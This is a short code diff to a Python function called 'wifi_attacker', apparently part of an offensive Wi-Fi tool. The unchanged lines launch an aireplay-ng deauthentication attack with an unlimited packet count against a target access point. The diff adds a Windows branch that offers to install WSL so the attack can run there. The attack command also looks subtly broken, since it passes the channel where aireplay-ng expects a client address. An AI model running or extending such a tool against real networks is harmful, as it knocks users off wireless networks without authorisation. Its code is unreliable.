@@ -13,7 +13,14 @@ def wifi_attacker():
         print("Launching deauthentication attack...")
         os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} -c {channel} {interface}mon")
     elif system == "Windows":
-        print("Wi-Fi attacks are not supported on Windows via this tool.")
+        print("Wi-Fi attacks are not natively supported on Windows.")
+        response = input("Would you like to set up a virtual Linux environment using WSL? (Y/N): ").strip().lower()
+        if response == 'y':
+            print("Installing WSL...")
+            os.system("wsl --install")
+            print("WSL installed. Please restart your system and re-run this script inside the WSL environment.")
+        else:
+            print("Exiting the tool.")
     else:
         print(f"Unsupported OS: {system}")
 
